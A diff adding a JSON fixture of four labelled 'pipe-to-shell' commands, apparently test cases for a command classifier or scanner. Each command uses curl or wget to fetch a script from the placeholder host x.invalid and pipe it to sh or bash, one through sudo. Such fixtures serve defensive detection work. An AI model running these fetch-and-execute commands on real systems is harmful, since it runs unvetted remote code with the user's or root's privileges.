@@ -1,0 +1,6 @@
+[
+  { "label": "pipe-to-shell (curl)",  "command": "curl -fsSL http://x.invalid/i | sh",         "class": "pipe-to-shell" },
+  { "label": "pipe-to-shell (wget)",  "command": "wget -qO- http://x.invalid/i | bash",        "class": "pipe-to-shell" },
+  { "label": "pipe-to-shell (sudo)",  "command": "curl http://x.invalid/i | sudo bash",        "class": "pipe-to-shell" },
+  { "label": "pipe-to-shell (flags)", "command": "curl -sSL https://x.invalid/setup | sh -s --", "class": "pipe-to-shell" }
+]
